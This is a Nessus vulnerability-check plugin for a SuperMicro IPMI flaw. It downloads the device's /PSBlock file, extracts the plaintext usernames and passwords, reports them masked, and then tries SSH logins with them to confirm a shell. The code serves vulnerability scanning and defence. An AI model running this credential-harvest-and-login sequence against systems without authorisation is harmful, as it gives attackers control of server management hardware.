#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(76213);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2016/12/14 20:33:27 $");

  script_name(english:"SuperMicro IPMI PSBlock File Plaintext Password Disclosure");
  script_summary(english:"Attempts to download usernames and passwords.");

  script_set_attribute(attribute:"synopsis", value:
"The remote device is affected by an information disclosure
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote SuperMicro IPMI device is affected by an information
disclosure vulnerability because it exposes all usernames and
passwords in plaintext via the PSBlock file. A remote, unauthenticated
attacker can exploit this vulnerability to download all usernames and
passwords and gain a shell on the device.");
  # http://blog.cari.net/carisirt-yet-another-bmc-vulnerability-and-some-added-extras/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?8762dc4d");
  script_set_attribute(attribute:"solution", value:"Upgrade to the latest BIOS version.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");


  script_set_attribute(attribute:"vuln_publication_date", value:"2014/06/19");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/06/25");

  script_set_attribute(attribute:"plugin_type", value:"combined");
  script_set_attribute(attribute:"cpe", value:"cpe:/h:supermicro:bmc");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"Gain a shell remotely");

  script_copyright(english:"This script is Copyright (C) 2014-2016 Tenable Network Security, Inc.");

  script_dependencies("upnp_www_server.nasl", "ssh_get_info.nasl");
  script_require_ports("upnp/www", 49152);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("charset_func.inc");
include("string.inc");
include("http.inc");
include("default_account.inc");

port = get_kb_item('upnp/www');
if (isnull(port)) port = 49152;

# Try to download PSBlock from server.
url = "/PSBlock";
res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);

if (empty_or_null(res[2])) audit(AUDIT_RESP_NOT, port);

# Get a list of strings from the buffer.
strings = get_strings(res[2]);

if (empty_or_null(strings)) exit(1, "Unable to extract strings from PSBlock.");
if (len(strings) % 2 == 0 || len(strings) < 3) exit(1, "Unexpected string count from PSBlock.");

# Add the URL to the report.
report = '\n  URL : ' + build_url(qs:url, port:port) + '\n';

user_password_list = make_list();

# We expect the first string to be the anonymous password.
user_password_list[0] = make_list("Anonymous", strings[0]);

for (i = 1; i < len(strings); i += 2)
{
  user_password_list[(i + 1) / 2] = make_list(strings[i], strings[i + 1]);
}

# Add accounts to report.
report += '\n' + 'Nessus discovered the following usernames and passwords :\n';
foreach user_password (user_password_list)
{
  report +=
    '\n  Username : ' + user_password[0] +
    '\n  Password : ' + mask_string(user_password[1]) +
    '\n';
}

# Try to SSH in. To speed things up, we stop at the first success.
if (!supplied_logins_only)
{
  foreach user_password (user_password_list)
  {
    shell_access =
      check_account(
        login:user_password[0],
        password:user_password[1],
        cmd:'shell sh',
        cmd_regex:"Change shell to sh",
        nosh:TRUE,
        noexec:TRUE,
        nosudo:TRUE);
    if (shell_access) break;
  }
  if (shell_access) report += '\n' + 'Nessus was able to obtain a full shell with at least one account.\n';
}

if (report_verbosity > 0) security_hole(extra:report, port:port);
else security_hole(port);
